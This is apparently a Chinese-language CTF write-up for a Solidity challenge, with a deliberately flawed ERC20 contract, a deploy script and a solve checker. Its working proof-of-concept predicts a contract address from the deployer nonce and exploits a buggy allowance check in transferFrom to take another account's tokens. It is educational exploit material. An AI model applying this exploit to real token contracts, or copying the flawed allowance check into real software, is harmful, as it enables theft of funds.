# Under the flow

# 源码
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.0;

import {IImprovedERC20} from "./interfaces/IImprovedERC20.sol";

contract ImprovedERC20 is IImprovedERC20 {
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    address public override owner;

    string public override name;
    string public override symbol;
    uint8 public override decimals;

    constructor(
        string memory _name,
        string memory _symbol,
        uint8 _decimals, //精度，单位
        uint256 _initialSupply
    ) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        owner = msg.sender;
        balanceOf[msg.sender] = _initialSupply;
    }

    function transfer(
        address _to,
        uint256 _value
    ) external override returns (bool) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    ) external override returns (bool) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(
            allowance[_from][msg.sender] - _value > 0, //溢出点
            "Insufficient allowance"
        );
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        return true;
    }

    function approve(
        address _spender,
        uint256 _value
    ) external override returns (bool) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    function mint(uint256 _value) external override {
        require(msg.sender == owner, "Only owner can mint");
        balanceOf[msg.sender] += _value;
    }

    function burn(address _who, uint256 _value) external override {
        require(balanceOf[_who] >= _value, "Insufficient balance");
        balanceOf[_who] -= _value;
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.0;

import {ImprovedERC20} from "../src/ImprovedERC20.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract Deploy is Script {
    function run() external {
        vm.startBroadcast();

        ImprovedERC20 erc20 = new ImprovedERC20(
            "Improved ERC20",
            "IMPERC20",
            18,
            100 ether
        );

        address otherUser = address(uint160(vm.envAddress("USER")) + 1);
        erc20.transfer(otherUser, 100 ether);

        console.log("address:ImprovedERC20", address(erc20));
        console.log("address:Other_User", address(otherUser));
    }
}

```

# isSolved
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.0;

import {ImprovedERC20} from "../src/ImprovedERC20.sol";
import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";

contract IsSolved is Script {
    function run() external view {
        ImprovedERC20 erc20 = ImprovedERC20(vm.envAddress("ImprovedERC20"));
        address user = vm.envAddress("USER");

        if (erc20.balanceOf(user) > 0) {
            console.log("is-solved:true");
        } else {
            console.log("is-solved:false");
        }
    }
}

```

# 思路
本来想create预测一下的，但是题目没给账户地址，反而直接把要预测的地址明给了，就直接用吧

如果 USER 是一个从未发过交易的地址，那它第 1 次部署出来的合约地址，就等于 USER + 1，所以Attack合约部署出来就是user+1,

# poc
```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.0;

import {ImprovedERC20} from "./ImprovedERC20.sol";

contract Attack {
    constructor(address token, address addr) {
        ImprovedERC20(token).approve(addr, 100 ether);
    }
}

```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.0;

import {ImprovedERC20} from "../src/ImprovedERC20.sol";
import {IImprovedERC20} from "../src/interfaces/IImprovedERC20.sol";
import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Attack} from "../src/Attack.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        address user = 0x34788137367a14f2C4D253F9a6653A93adf2D234;
        address tokenaddr = 0x78aC353a65d0d0AF48367c0A16eEE0fbBC00aC88;
        address otheruser = 0x34788137367a14F2C4D253f9A6653A93aDf2D235;
        new Attack(tokenaddr, user);
        ImprovedERC20(tokenaddr).transferFrom(
            otheruser,
            user,
            99 ether
        );
        vm.stopBroadcast();
    }
}

```





> 更新: 2025-07-31 16:11:19  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/cmiqi29y1fvvi5sw>